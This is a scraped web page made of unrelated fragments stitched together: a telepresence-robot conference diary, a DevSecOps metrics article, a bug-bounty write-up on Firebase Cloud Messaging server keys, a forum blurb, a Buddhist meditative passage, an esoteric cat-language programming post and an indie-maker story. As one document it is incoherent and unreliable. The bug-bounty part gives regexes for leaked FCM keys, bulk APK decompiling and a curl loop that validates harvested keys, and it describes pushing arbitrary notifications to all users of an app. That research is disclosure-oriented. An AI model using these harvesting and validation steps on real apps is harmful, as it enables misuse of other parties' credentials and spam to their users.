<p>Tetraplegic, because I’m effectively paralyzed from the neck down – the double doesn’t even have legs or arms. I could see and hear, and I could roll around like in a wheelchair. But slowly and carefully, and I sometimes needed assistance when things got in the way. Sometimes I got assistance, even when I didn’t need it, which felt both good and bad at the same time. Gradually people noticed that I could get around quite nicely myself, with some patience. I can’t turn my head, but I can turn my whole vehicle from side to side to see what’s going on. Of course, I don’t know what it’s really like to be a tetraplegic but I guess it’s probably something like this.</p>



<p>Drunk, because that thing sways quite often to stay in balance, and sometimes bumps into things or trips on small objects and falls flat on it’s face (happened only once, but it felt horrible).</p>



<p>Bad hearing and weak voice, because of the background noise in combination with my rather limited microphone and speaker. I often couldn’t follow the conversation going on, and people had to lean in close to hear what I was saying.</p>



<p>Another interesting thing. Sometimes when I rolled up to a group of people, they stopped talking and stared at me instead. As if I was some kind of object (and maybe I was…. or maybe not? Any philosophers out there?). Lots of smiles and laughs of course, and the occasional shocked surprised as someone realized that “hey, there’s a person inside that thing!”. In some cases I felt more like a comic relief than a true conference participant. While listening in on a conversation (well, trying…) I sometimes noticed people staring at me, and they couldn’t see that I was staring right back at them. A weird feeling of eye contact and, well, not.</p>



<p>Although, I admit, it was quite fun to sometimes bump into people and see them shriek in surprise at being accosted by an ipad on a stick on wheels, with a grinning guy on the screen. Even earned me a kiss on the cheek once. Or at least that’s what I&nbsp;<em>think</em>&nbsp;she was doing. It wasn’t a slap at least, I don’t think.</p>



<p>I asked one guy for some coffee, and he almost did, until he realized what he was talking to :o)</p>



<p><strong>Running out of batteries</strong></p>



<p>Unfortunately the ipad on the double wasn’t fully charged from start, so it started running low quite quickly. I didn’t want to disrupt the ongoing presentation, so I tweeted for help, and someone kindly plugged me in.</p>



<figure><a href="http://hkniberg.files.wordpress.com/2013/12/need-batteries.jpg"><img src="https://hkniberg.files.wordpress.com/2013/12/need-batteries.jpg?w=562&amp;h=499" alt="Image"></a></figure>



<p>During a break, I logged off to make it charge faster (which it didn’t). Then later, when logging in again, I found myself standing a few meters away from the nearest person. I wanted to be unplugged so I could move around! Heeeeelp! but nobody could hear me! Now what? I guess I could tweet again, but it might take a while for someone to react.</p>



<p>Ah, I could display a message on my screen! But how? The app on my end will only send the video stream, i.e. my face on the camera. I can’t get it to display something else. Ah, I could write a note! But darn, I’m sitting on a beach in Thailand and no paper or pen nearby.</p>



<p>Then I realized that I had my laptop with me (as backup solution). So I fired up textedit and wrote a message</p>



<figure><a href="http://hkniberg.files.wordpress.com/2013/12/unplug-me.png"><img src="https://hkniberg.files.wordpress.com/2013/12/unplug-me.png?w=256&amp;h=224" alt="Image"></a></figure>



<p>I made the font huge (as in covering the whole screen), and pointed my ipad cam at it. And moved it back and forth a bit for effect (causing the text to pulsate). That worked! People at the conference saw the message quickly and unplugged me.</p>



<p>The charger didn’t work though, so I was still at about 10%. I figured I’d just participate as long as I could, and the battery would die when it died. That was also a weird feeling, knowing that at any moment I will “die”, my double will go limp, and I’ll suddenly wake up back on the beach in Thailand. Total Matrix moment! I saw the battery counter go lower and lower, and my minutes were numbered, so I had to make the most of it. Carpe Minutus! Seize the minute!</p>



<p><strong>Conclusions</strong></p>



<ul><li>Double is a supercool and practical gadget, looks nice and takes very little space.</li><li>Watching a presentation works</li><li>Having conversations in small groups works, but not if there’s other conversations happening nearby.</li><li>Moving around works, but slowly, and not with big thresholds or stairs.</li></ul>



<p>Features I would love to have:</p>



<ul><li>the ability to “tilt my head” upwards a bit. I could look down at my wheel via a nifty fold-down mirror (great for navigating around chairs and such), but I couldn’t look up, and the robot is rather short even when fully extended, so often I found myself involuntarily staring at someone’s chest as they talked to me. A bit awkward, especially with girls….)</li><li>the ability to display a message or sketch, not just my videocam &amp; face all the time.</li><li>the ability to plug myself in for charging, like the docking pads that lawnmower robots use.</li><li>a louder speaker, for noisy environments</li><li>a directional mic that can be activated/deactivated, in cases where I want to hear the person in front of me and ignore the background noise.</li></ul>



<p>Oh, and If you’re going to sit on a beach in Thailand in the middle of the night, make sure you have mosquito repellant. And don’t forget the hands! I have like 30 mosquito bites on my hands, I’ll probably get dengue fever or something. But heck, sometimes you have to make sacrifices for science!</p>

<div><p><span><strong>TL;DR </strong></span>BOOM –&nbsp;Baseline Objectives and Optimization Measurements – is a framework for measuring <strong>DevSecOps capabilities</strong>. Its cornerstone is six security measures: basic counts, burndown rates, arrival rates, departure rates, survival rates and escape rates.</p><p>You can also watch the video of my recent talk: <a href="https://youtu.be/QBU9NHGr_fQ" rel="nofollow noopener" target="_blank">Kubernetes Security: Doing More With Less in Uncertain Times</a> from the Silicon Valley ISSA August meeting to learn more about this framework that helps you optimize your security program for fast moving software development teams.&nbsp;</p></div>

<p><span><strong>Bullet Holes And Bombers</strong></span></p>
<p><span>During WWII, the US Navy continually lost bombers to anti-aircraft artillery. In hopes of building a more resilient aircraft, officers suggested they examine all planes returning from battle. They came to the conclusion that reinforcements should go above the wings and tailpiece, where there were more bullet holes (see image above).</span></p>
<p><span>That approach seemed reasonable to everyone...except for one statistician by the name of Abraham Wald. Wald believed that the secret to building a more anti-aircraft-proof&nbsp;bomber lay in the planes that DIDN’T make it back. It turns out Wald was right.&nbsp;Planes that had damage in low impact areas (as seen above) survived. Planes that didn’t make it back had bullet holes in critical areas, where pilots sat and where the engines were located.</span></p></span><span>What was the problem here? The Navy officers were using the wrong object of measurement. If they had followed through with their plans, armor would have gone everywhere but where it was needed.&nbsp;The engines and cockpit would have stayed exposed, leading to a&nbsp;colossal waste of life and money.</span></p>
<p><span>We discuss the problems of having the wrong object of measurement</span> <a href="https://www.amazon.com/How-Measure-Anything-Cybersecurity-Risk/dp/1119085292/ref=sxts_sxwds-bia-wc-p13n1_0?crid=MLTJ39MPZQK8&amp;cv_ct_cx=how+to+measure+anything+in+cybersecurity+risk&amp;dchild=1&amp;keywords=how+to+measure+anything+in+cybersecurity+risk&amp;pd_rd_i=1119085292&amp;pd_rd_r=7aceaada-979b-4503-a653-0e78add88569&amp;pd_rd_w=uMKQa&amp;pd_rd_wg=XYuhR&amp;pf_rd_p=13bf9bc7-d68d-44c3-9d2e-647020f56802&amp;pf_rd_r=33QDWJ755FV7P8X9NQEV&amp;psc=1&amp;qid=1597729439&amp;sprefix=how+to+measure%2Caps%2C217&amp;sr=1-1-791c2399-d602-4248-afbb-8a79de2d236f">in our first book</a><span>.

<p><span>We confuse what’s <em>easy to measure</em>,&nbsp;like bullet holes in returned planes, with what is <em>important to measure</em>, like bullet holes in downed planes. We deceive ourselves by measuring only what is obvious, forgetting the goal of our measurement. Wald’s statistics training prepared him to catch this form of self deception. As security people, the question we have to ask is, are we using the right objects of measurement in security? Have we been deceived into focusing on the wrong things year after year? And am I the only one having these thoughts?</span></p>

We all share an intuition that there is more than meets the eye in the security operations, optimization, and risk management game. That intuition (and frustration) led me to co-author a book dedicated to security measurement. That book led to the BOOM Framework, a second book on metrics, and lots of (100+) consulting engagements.</span></p>
<p><span>What I heard in my engagements, and what BOOM seeks to answer, are questions like:</span></p>
<blockquote>
<ul>
<li><span>Am I remediating security risk fast enough?</span></li>
<li><span>Am I creating more or less attack surface over time?</span></li>
<li><span>Am I reducing the time to live of threats and vulnerabilities?</span></li>
<li><span>Am I focused on the right risks?</span></li>
</ul>
</blockquote>
<p><span>BOOM makes answering these questions simpler.</span></p>

<p><span>BOOM stands for Baseline Objectives and Optimization Measurements. The purpose of BOOM is to make your security programs stronger. It does that by helping you <strong>measure</strong>, <strong>monitor </strong>and <strong>optimize</strong>&nbsp;your <strong>security capabilities</strong>. And while BOOM was born out of a need to measure modern DevSecOps productivity, it can be applied to traditional security environments.</span></p>
<p><span>There are two approaches at play in BOOM: <strong>Basic</strong>&nbsp;and <strong>Advanced</strong>. Or if you like: <strong>Deterministic</strong>&nbsp;and <strong>Probabilistic</strong>. Most people should start with <strong>Basic</strong>, which uses simple arithmetic to generate counts and averages.</span></p>
<p><span>“BOOM&nbsp;Advanced” uses what will look like “Data Science” to most readers, although the correct term is “Predictive Analytics.” Our first book is a predictive analytics book for making decisions when you have near zero data. BOOM’s advanced methods use predictive analytics to help you make better decisions with small and large data alike. The focus of those measures is forecasts and capability optimization.</span></p>
<p><span><strong>Baselines And Objectives</strong></span></p>
<p><span>The first component of BOOM is <strong>b</strong><strong>aselines</strong>&nbsp;- &nbsp;the fundamental measurements behind the BOOM framework. These measures baseline your capabilities over time, ultimately showing if your capabilities are optimizing (improving), scaling (keeping up) or degrading.</span></p>
<p><span>These baselines are used to both define and measure the second component of BOOM - <strong>objectives</strong>.&nbsp;Objectives define the capability “outcome” you seek to improve. An example objective might be: <em>Reduce the time to live of </em><em>customer</em><em>&nbsp;facing exploitable vulnerabilities. </em>You would use one or more baseline to support this objective.</span></p>
<p><img alt="" src="https://www.soluble.ai/hs-fs/hubfs/Google%20Drive%20Integration/New%20BOOM-3.png?width=427&amp;name=New%20BOOM-3.png" title="" width="427" srcset="https://www.soluble.ai/hs-fs/hubfs/Google%20Drive%20Integration/New%20BOOM-3.png?width=214&amp;name=New%20BOOM-3.png 214w, https://www.soluble.ai/hs-fs/hubfs/Google%20Drive%20Integration/New%20BOOM-3.png?width=427&amp;name=New%20BOOM-3.png 427w, https://www.soluble.ai/hs-fs/hubfs/Google%20Drive%20Integration/New%20BOOM-3.png?width=641&amp;name=New%20BOOM-3.png 641w, https://www.soluble.ai/hs-fs/hubfs/Google%20Drive%20Integration/New%20BOOM-3.png?width=854&amp;name=New%20BOOM-3.png 854w, https://www.soluble.ai/hs-fs/hubfs/Google%20Drive%20Integration/New%20BOOM-3.png?width=1068&amp;name=New%20BOOM-3.png 1068w, https://www.soluble.ai/hs-fs/hubfs/Google%20Drive%20Integration/New%20BOOM-3.png?width=1281&amp;name=New%20BOOM-3.png 1281w" sizes="(max-width: 427px) 100vw, 427px"></p>
<p><span>In the table below, you can see how we might assemble the six <em>basic</em>&nbsp;baselines to support this objective. While this example uses all six baseline metrics, BOOM is designed to give you the flexibility to bring in only the baselines you need based on the data you have.&nbsp;It would be a waste of time and effort to shoehorn in every baseline for every objective. In many cases, you may only need one or two baselines to satisfy your measurement and optimization outcomes. Or, you may only have access to enough data to support a few measures. The goal is to start, not to be perfect.</span></p>

The screenshot below shows the count, time to live, and a burndown baseline. While only a handful of baselines are present in this example, it demonstrates how they can work together to tell a more complete story. The critical vulnerability rate is unchanged over the previous week. Despite that, the average age of vulnerabilities is increasing. Lastly, there is 0 burndown.</p>

<h2 id="tldr">TL;DR</h2>
<p>A malicous attacker could control the content of push notifications to any application that runs the FCM SDK and has it’s FCM server key exposed &amp; at the same time send these notifications to every single user of the vulnerable application!</p>
<p>These notifications could contain anything the attacker wants including graphic/disturbing images(via the <code>"image": "url-to-image"</code> attribute) accompanied with any demeaning or politically inclined message in the notification!</p>

<p>The beginning of this year has seen a lot of <a href="https://twitter.com/search?q=%23androidhackingmonth&amp;src=typed_query">#AndroidHackingMonth</a> tweets popup which led to some pretty good disclosures showing different techniques and tricks with respect to android application hacking. I was intrigued and decided to fiddle a little with android hacking.</p>

<h2 id="gathering-a-dataset-of-decompiled-apks">Gathering a dataset of Decompiled APKs</h2>
<p>After rammaging through a dozen blogs on how to begin with hacking android applications and reading them to the best of my abilities, I decided to initially start with looking for secrets in an android application.</p>
<p>This meant decompiling an android apk and just grepping for some know patterns within the <code>strings.xml</code> file as that’s usually where secrets can be found and also the decompiled <code>.smali</code> files for “secret declaration” within the code i.e mediocre static code analysis. Sounds like a good first step!</p>
<p>I started downloading apks of some public and private programs from <a href="https://hackerone.com/">Hackerone</a> and <a href="https://bugcrowd.com/">Bugcrowd</a> so as to collect an initial dataset and then go in looking for secrets all together.</p>
<p>I was able to achieve this by the help of <a href="https://github.com/defparam/h1passets">h1passets</a>. I also sent in a mediocre <a href="https://github.com/defparam/h1passets/pull/2">PR</a> to collect all the package ids of the apks of Hackerone’s private programs. I then scraped a few package ids of public programs of HackerOne and Bugcrowd from <a href="https://github.com/arkadiyt/bounty-targets-data">bounty-targets-data</a>.</p>
<p>Once the package ids were collected, I took some time out to download them from <a href="https://apkcombo.com/">apkcombo</a>. After having close to 50-70 apks downloaded into a single folder, I began mass decompiling these apks using <a href="https://bitbucket.org/iBotPeaches/apktool/downloads/">apktool.jar</a>.</p>
<p>I did this with a simple bash script shown below</p>
<div><pre><code data-lang="bash"><span>#!/bin/bash
</span><span></span>
<span>for</span> file in *.apk
<span>do</span>
java -jar ~/APK_Research/apktool.jar d <span>$file</span> -o decompiled_apks/<span>$file</span>/
<span>done</span>
</code></pre></div><p>So now I had a credible sized dataset of decompiled apks to work with!</p>
<hr>
<h2 id="variable-names-have-it-all">Variable names have it all</h2>
<p>After hooking up <a href="https://github.com/tomnomnom/gf">gf</a> (A wrapper around grep) with a modified version of regex patterns from <a href="https://github.com/xyele/zile">Zile</a> (i remeber this was named something else initially), I began a simple gf grep through the decompiled apks directory to see if I could spot some secrets right away and report them.</p>
<p>I used my vps to run overnight gf greps from the Decompiled_apks folder and saved those results in separate files for further analysis. These saved files contain the API key/secret, their location and also their variable name.</p>
<p>Come the next day, I looked up most of the files and found pretty much nothing, just a bunch of SDK keys which were meant to be public, API keys with limited scope etc.</p>
<p>It was time to look into the <code>gcp_keys.txt</code> that contained the google cloud project (GCP) API keys. I knew they would usually contain API keys for Google Maps Or Google Crash Reporting API which had no impact.</p>
<p>But it was common knowledge that GCP keys could be multi-privileged i.e  the same key could be utilized for different enabled API’s!</p>
<p>So I began looking into the <code>gcp_keys.txt</code> file but with more focus on the variable names. Variable names can sometimes provide a lot of information about the privilege of the key. Here’s a rough snippet of the variable names I encountered inside the <code>gcp_keys.txt</code>:</p>
<div><pre><code data-lang="xml">apk-1/AndroidManifest.xml: <span>&lt;meta-data</span> android:name=<span>"server_key"</span> android:value=<span>"AIzaSyB[REDACTED]"</span><span>/&gt;</span>
apk-3/trx.smali:    const-string v1, "AIzaSyQ[REDACTED]"
apk-5/AndroidManifest.xml: <span>&lt;meta-data</span> android:name=<span>"com.google.android.geo.API_KEY"</span> android:value=<span>"AIzaSy[REDACTED]"</span><span>/&gt;</span>

</code></pre></div><p>So from the file, I was able to extract the below list of <em>as I call it</em> potential variable names.</p>
<p>google_maps_geocoder_key, notification_server_key, google_notification_key, app_api_key, googlePlacesWebApi, server_key … etc</p>
<p>I felt these keys were capable of something more! I started looking for articles/blogs containing similar variable names in order to conclude what exactly the key does.</p>
<p>Both <code>server_key</code> and <code>notification_server_key</code> led me to <a href="https://firebase.google.com/docs/cloud-messaging/server">Firebase Cloud Messaging / FCM</a></p>
<hr>
<h2 id="the-fcm-server-key---reading-docs-and-validation-of-the-key">The FCM Server Key - Reading docs and validation of the key</h2>
<p>After visiting <a href="https://firebase.google.com/docs/cloud-messaging/server">Firebase Cloud Messaging / FCM</a> ,i understood that the keys grepped could somehow be linked to cloud messaging aka push notification services. I was yet to find an article that explained everything, so I started digging again.</p>
<p>From the docs I got a gyst of a few things.</p>
<ul>
<li>There’s a server environment which deals with <strong>Send Requests</strong> i.e authorized requests that enforce push notifications</li>
<li>There’s a client FCM SDK that takes care of generating IID tokens that identifies an app instance on a device uniquely.</li>
</ul>
<p>Possibilities with the keys at hand? I either could have a key that has some role in the server environment or a client-end SDK key which was already meant to be public.</p>
<p>I focused on the server environment and came across the <a href="https://firebase.google.com/docs/cloud-messaging/migrate-v1">Legacy to HTTP v1 server protocol migration guide</a> . This article recommended migrating from a <a href="https://firebase.google.com/docs/cloud-messaging/http-server-ref">Legacy HTTP protocol</a> to the modern HTTP v1.</p>
<p>But as you see, It also shows how the <code>AizaSy</code> keys can be used as authorization keys under the <a href="https://firebase.google.com/docs/cloud-messaging/migrate-v1#update-authorization-of-send-requests">before section</a>, the same is shown in the image below</p>
<p><img src="https://abss.me/posts/fcm-takeover/aizasy.png" alt="FCM Authorization done via AizasY" title="FCM Authorization"></p>
<p>From this,  I figured the <code>AizaSy</code> keys are used for authorization of <strong>Send Requests</strong> via the Legacy HTTP protocol. This meant sending push notifications of my choice via the legacy HTTP protocol.</p>
<p>We cannot use the modern HTTP v1 protocol as it is based on the oauth2.0  security model. This makes use of bearer tokens of service accounts.</p>
<p>So reading the docs <a href="https://firebase.google.com/docs/cloud-messaging/auth-server#authorize-http-requests">here</a> under the legacy http protocol, I found a simple <code>curl</code> to validate the key.</p>
<div><pre><code data-lang="bash"><span>api_key</span><span>=</span>YOUR_SERVER_KEY

curl --header <span>"Authorization: key=</span><span>$api_key</span><span>"</span> <span>\
</span><span></span>     --header Content-Type:<span>"application/json"</span> <span>\
</span><span></span>     https://fcm.googleapis.com/fcm/send <span>\
</span><span></span>     -d <span>"{\"registration_ids\":[\"ABC\"]}"</span>
</code></pre></div><p>If the above curl returns a <code>200 OK</code> response status code then the key is legit. Anything other than <code>200 OK</code> and the key is invalid. Testing this on one of the suspected keys showed a <code>200 OK</code> response status code!</p>
<p>I knew how to validate the key and also the purpose of the key.</p>
<p>To sum things up, here is an overview of the FCM Architecture</p>
<p><img src="https://abss.me/posts/fcm-takeover/fcm-workings.png" alt="FCM Architecture"></p>
<hr>
<h2 id="discovering-key-variations">Discovering Key Variations</h2>
<p>As I was reading the forementioned <a href="https://firebase.google.com/docs/cloud-messaging/auth-server#authorize-http-requests">article</a> on authorizing legacy HTTP requests, I followed the first instruction that said to visit the <a href="https://console.firebase.google.com/project/_/settings/cloudmessaging/">Cloud Messaging tab</a> of the firebase project in order to locate the FCM server key <code>AizaSy</code> and there I found another variation of the key!</p>
<p>The image below shows both variations of a FCM server key.</p>
<p><img src="https://abss.me/posts/fcm-takeover/fcm_keys.png" alt="FCM Keys" title="FCM Authorization"></p>
<p>The FCM server key of regEx <code>AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}</code> is similar to the Legacy Server key i.e both are project credentials having authority over sending authorized send requests to all FCM SDK enabled applications under the firebase project. This key type is recommended to be used as per the docs.</p>
<p>Later on, my search for various blogs regarding the GCM( Google Cloud Messaging ) to FCM migration I noticed there is also the possibility of a gcp key to exist with formerly gcm permissions as seen <a href="https://www.izooto.com/blog/generate-gcm-sender-id-server-api-key">here</a>.</p>
<p>GCM has been long deprecated but due to migration and to stop any regressions, such keys were still valid for the new FCM endpoints! This is the final variation of the FCM server key.</p>
<p>So we have 3 types of FCM server keys :</p>
<ul>
<li>A FCM server key of regEx <code>AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}</code></li>
<li>A Legacy FCM server Key of regEx <code>AIzaSy[0-9A-Za-z_-]{33}</code>. This gets automatically added to your GCP project.</li>
<li>A GCP key with FCM privileges of the same regEx as above <code>AIzaSy[0-9A-Za-z_-]{33}</code>. In This variation, the key is createdunder a GCP project and then provided the essential privileges.</li>
</ul>
<p>As of now the Legacy Server Key has been deprectaed, so any forthcoming firebase project will not contain Legacy Server Keys anymore :</p>
<p><img src="https://abss.me/posts/fcm-takeover/deprecated_legacy_server-key.png" alt="Deprecated Legacy Server Key" title="FCM Authorization"></p>
<p>But if found, they are still valid! (again to prevent any backlogs and regressions!)</p>
<p>I quickly added the new regEx <code>AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}</code> to my gf profile and began another round of grep through the decompiled apk dataset and validated them!</p>
<p>Below is the combined gf profile for all key variations</p>
<div><pre><code data-lang="json">{
    <span>"flags"</span>: <span>"-oEarHn"</span>,
    <span>"patterns"</span>: [

     <span>"AIzaSy[0-9A-Za-z_-]{33}"</span>,
     <span>"AAAA[a-zA-Z0-9_-]{7}:[a-zA-Z0-9_-]{140}"</span>
 ]
}
</code></pre></div><p>More hits followed!</p>
<p>After grepping for the keys, I wrote a simple validation script that places all conforming FCM keys into a single txt file</p>
<div><pre><code data-lang="bash">
<span>#!/bin/bash</span>
<span>while</span> <span>read</span> -r key
<span>do</span>
<span>code</span><span>=</span><span>`</span>curl --header <span>"Authorization: key=</span><span>$key</span><span>"</span> --header Content-Type:<span>"application/json"</span> -s -o /dev/null -w <span>"%{http_code}"</span> -d <span>"{\"registration_ids\":[\"ABC\"]}"</span> <span>'https://fcm.googleapis.com/fcm/send'</span><span>`</span>
<span>if</span> <span>[</span> <span>"</span><span>$code</span><span>"</span> <span>==</span> <span>"200"</span> <span>]</span>
<span>then</span>
<span>echo</span> <span>"[*]       Key is </span><span>$key</span><span>"</span>
<span>echo</span> <span>"</span><span>$key</span><span>"</span> &gt;&gt; valid_keys.txt
<span>fi</span>

<span>#gcp_keys.txt has the all the grepped keys, both AAAA[a-zA-Z0-9_-]{7}:[a-zA-Z0-9_-]{140} and AIzaSy[0-9A-Za-z_-]{33}</span>
<span>done</span>&lt;<span>"/gcp_keys.txt"</span>

<span>#eliminate duplicates</span>
sort -u -o valid_keys.txt valid_keys.txt
<span>echo</span> <span>"DONE!"</span>
</code></pre></div><p>To my surprise, my initial dataset of 50 decompiled apks gathered A LOT of …</p></div></div>

                      Club P. is essentially an anonymous discussion forum but with important differences compared to traditional imageboards. Most significantly, you have to be a member to post, and membership costs $2 per month. That's a modest amount that after hosting and service fees should leave me no profit, but it will be a barrier to entry that I hope will screen in earnest folks. Membership means that, unlike completely anonymous forums, users do have to create an account, which will help with moderation.

So, as I sat under the bridge while trucks rumbled down Box Street I imagined that the slippery flesh of my ignorance, raw and painful, was mixing with a seemingly endless ocean of my own warm sticky blood, rich in iron: my desire; and my rattling bones, still moist and full of rich marrow: my hatred. I mixed these together and offered it in a vast torma vessel — my own skull. I offered this to the local gods, the local protectors, to the particular trolls that inhabit the Pulaski Bridge, as well as my own trolls. This ambrosial nectar, the very last remnants of my body, I offered to this particular place — this polluted earth, forgotten and ignored by many who speed by, is the same earth that supported the Buddha. Somewhere underneath that thick toxic sludge is the same earth that the Buddha touched, similarly, within ourselves is the same Buddha. The ability to recognize "the lama-as-appearance" is always part of us.

  <div itemprop="articleBody">
    <p>Computer Programming can be hard , can be complex to understand for some people, but that doesn’t mean that they can’t be fun. From the beginning , programming languages were in English , well most of them except some special languages. But I have designed a programming language which let’s people program in Cats’ language, Mew Mew Mew. Which despite being a esoteric language is very much usable , and let’s programmers create complex program. I
also have conducted a small study to find real world use cases of MewMew programming language.</p>



<p>Programming in Cats’ language , it is lunacy or what? But it’s reality. With MewMew one can program in cats’ language, but it is not actually the cats’ language but the human interpretation of cats’ language , mew mew mew.
MewMew is an esoteric programming language built with ANTLR4 and C++. It is not intended to be used for commercial or mainstream programming instead , it was designed to be learning project for me or any other novice language designer who want get started building their own programming language.
While majority of programming languages are in English or I should say human languages but this language intends to be one of the first language to be in ‘non-human’ (not technically) language.</p>



<p>MewMew is implemented using ANTLR4 and C++. Though using Dynamically typed host language would be given me more flexibilty designing the language, I chose to use a statically typed for a multiple reasons , First it is fast. Second , the language becomes much more runtime safe. When experimenting with early prototypes , I tried Python and PLY (Python Lex and Yacc) , Tatsu and even Flex &amp; Bison. Python and PLY was not chosen because it was too much slow , even Cythonzing didn’t give advantage. Tatsu was kind of better than PLY but again speed issue, and Flex &amp; Bison , I didn’t chose them because of their over complexity , a language small as MewMew required a huge codebase. Finally I setteled for ANTLR4 , It was comparativaly fast thanks to its ALL(*) algorithm , on top of that the API of it was very easy to catch on but also very robust.
When Designing MewMew , I left some places which can be used to improve or extend the language in future.</p>

<p>MewMew doesn’t use any traditional numbers (0 to 9) instead it uses ‘mew’s. For example , ‘mew’ will get converted to 1 , ‘mewmew’ will get converted to 2  , ‘mewmewmewmewmewmewmewmewmewmew’ will get converted to 10 and so on so forth but zero has special case , to get only zero one can use ‘mew-mew’.
MewMew also has few operator similar to C++, which are discussed in GitHub project repository README. MewMew is all about numbers, it doesn’t contain any other types such as strings , chars , arrays etc , which keeps the language lightweight. Every number in mewmew is a floating point number.
MewMew also has if , if else and a repeat loop aka. Meow loop expression. It also has a special type of function called scratch function which open the door of extending the language in future. Syntax of if statement is something like Expression ? Statements ; where ‘Expression’ takes any type of expression , on Truthy value the ‘Statements’ will get executed. Similar to that Expression ? Statements1 : Statements2 ; is the syntax of if-else statement, if the value of ‘Expression’ is truthy the ‘Statements1’ will get executed else ‘Statement2’ will get executed. The syntax of meow loop is something like this @ Expression : Statements; the ‘Statements’ will get executed N times where N = Expression. Scratch function syntax is something like #(Expression) where ‘#’ can be repeated from 1 to many times. But as of 5 functions are defined only.</p>

<p>Here’s a comparison of some simple program written in MewMew and C++ :</p>

<table>
  <thead>
    <tr>
      <th>In MewMew</th>
      <th>In C++</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>m=mew;<br>@#####(mew):<br>m % mewmew == mew – mew ?<br>::m;<br>;<br>m = m + mew;<br>;<br></td>
      <td>#include <iostream><br>using namespace std;<p>int main()<br>{<br>for(int m = 1; m &lt;= 100 ; ++m){<br>if (m%2 == 0){<br>cout &lt;&lt; m &lt;&lt; endl;<br>}<br>}<br>}</p></iostream></td>
    </tr>
    <tr>
      <td>m=mew;<br>@####(mew):<br>m % mewmewmew == mew – mew &amp; m % ###(mew) == mew – mew ? <br>::m;<br>;<br>m = m + mew;<br>;<br></td>
      <td>#include <iostream><br>using namespace std;<p>int main()<br>{<br>for(int m = 1; m &lt;= 100 ; ++m){<br>if (m%3 == 0 &amp;&amp; m%5==0){<br>cout &lt;&lt; m &lt;&lt; endl;<br>}<br>}<br>}</p></iostream></td>
    </tr>
  </tbody>
</table>



<p>MewMew is an esoteric language which is morelike a joke than a commercial language. It was created to be a leaning project for which it has done successfully. In future it also might work as an reference to learning language designing for future.With the scratch function it opens new doors forexpanding the language in future. It will only took a few lines of code in switch…case statement to add a new function.</p>

<p><span>In every industry but tech, there’s hundreds of competitors within each vertical.</span></p>
<p><span>By building something that already exists, it curtails the initial validation period for a product.</span></p>
<p><span>As a maker, it’s taken me over two years to truly understand this concept.</span></p>
<p><span>After listening to every Indie Hackers podcast, this was a common theme I’d recognised between the most successful products.</span></p>
<p><span>Whether it be Less Annoying CRM, Transistor.FM, or The Hustle, these products entered a pre-conceived vertical with existing customer demand.</span></p>
<p><span>Until now, it feels like I’ve spent my early 20’s in the pursuit of product/market fit.</span></p>
<p><span>What I never understood, was that it already existed across thousands of markets.</span></p>
<p><span>With a background working in tech startups, I’ve always valued innovation above anything else.</span></p>
<p><span>After spending two full years failing to gain any product traction, I realised this was my greatest weakness as a maker.</span></p>
<p><span>After two years of building products, I’d generated $0 in revenue.</span></p>
<p><span>In August 2020, I generated my first $66 (AUD) from a product in less than 24 hours.</span></p>
<p><span>How did I do it?</span></p>
<p><span>By prioritising validation instead of innovation.</span></p>
<p><span>Although it’s not much, this $66 was a gargantuan milestone in my maker journey.</span></p>

<p><span>Let me quickly backtrack and give you a brief history of my experiences leading to this point.</span></p>
<p><span>If you’re an early-stage maker struggling to generate revenue, this post will share some actionable insights to help streamline your own product journey.</span></p>


<hr>


<p><span><b>June 2018</b></span></p>
<p><span>In 2018, I had my first surreal moment to becoming a maker. It was my first idea for a product.</span></p>
<p><span>I wanted to build the </span><a href="https://dribbble.com/" target="_blank" rel="noopener"><span>Dribbble</span></a><span> for digital marketers.</span></p>
<p><span>As a digital marketer myself, I planned to create a platform where I could showcase a portfolio of my real work.&nbsp;</span></p>
<p><span>My vision was to build the worlds leading community hub for digital marketers, streamlining the way they showcase work and source job opportunities.</span></p>
<p><span>As a non-technical maker, I started building with the tools I had.&nbsp;</span></p>
<p><span>Before creating a product, I spent a year of my life trying to build an existing community as a Facebook group.</span></p>
<p><span>At its peak, I’d grown this community to roughly 300 members, although I’m sure only a fraction of these were active users.</span></p>
<p><span>Looking back, I’m thankful that I tried to build a community before creating a product, although, to be fair, I didn’t have any other option – I didn’t know how to code.</span></p>


<hr>


<p><span><b>June 2019</b></span></p>
<p><span>A year later, I stumbled across the no-code landscape.&nbsp;</span></p>
<p><span>This changed everything.</span></p>
<p><span>I could finally build my grand vision for a platform.</span></p>
<p><span>This was where I started spiralling down a path of first-time maker mistakes.</span></p>
<p><span>Did I even bother to ask my community if this was a platform they wanted?</span></p>
<p><span>No.</span></p>
<p><span>Did I validate the idea?</span></p>
<p><span>Certainly not.</span></p>
<p><span>Was this a product that could even generate revenue from day one?</span></p>
<p><span>Not a chance.</span></p>
<p><span>So when November of 2019 came around, I was so confused when my platform hadn’t gained any real traction.</span></p>
<p><span>I’d spent four straight months building this product, then an additional two months trying to gain user adoption.</span></p>
<p><span>I completely burnt myself out trying to maintain something that never had a chance.</span></p>
<p><span>So what did I decide to do?</span></p>
<p><span>Tear it down and start again.</span></p>


<hr>


<p><span><b>January 2020</b></span></p>
<p><span>It’s a new year and I’d had the opportunity to learn first-hand from my past mistakes.</span></p>
<p><span>At this point, I’m 18 months into making and I hadn’t generated a single dollar in revenue.</span></p>
<p><span>This time around, I had clear expectations and guidelines to follow.</span></p>
<ol>
<li><span>I had to sell to businesses</span></li>
<li><span>I wasn’t allowed to build a product until I’d confidently validated an idea</span></li>
</ol>
<p><span>At this point, I was freelancing as a digital marketer, so I was still eager to build a product within this industry.</span></p>
<p><span>After hearing </span><a href="https://www.indiehackers.com/forum/how-to-build-a-life-you-love-by-quitting-everything-else-with-lynne-tye-of-key-values-706009faea" target="_blank" rel="noopener"><span>Lynne Tye’s episode</span></a><span> of the Indie Hackers podcast, I knew exactly what I needed to build.</span></p>
<p><span>I was going to build the </span><a href="https://www.keyvalues.com/" target="_blank" rel="noopener"><span>Key Values</span></a><span> for digital marketers. It’d be a place where passionate digital marketers could source opportunities with teams that shared their values.</span></p>
<p><span>One of the core reasons why I’m a freelancer is because I’d never found a company to work for that shared my own personal values.</span></p>
<p><span>I was absolutely blown away when I first heard Lynne’s story.</span></p>
<p><span>Her product wasn’t anything technically advanced, and her background wasn’t in marketing. So how was it that Lynne was able to gain as much traction as she did?</span></p>
<p><span>She solved a real problem for businesses and spent a long time validating her idea.</span></p>
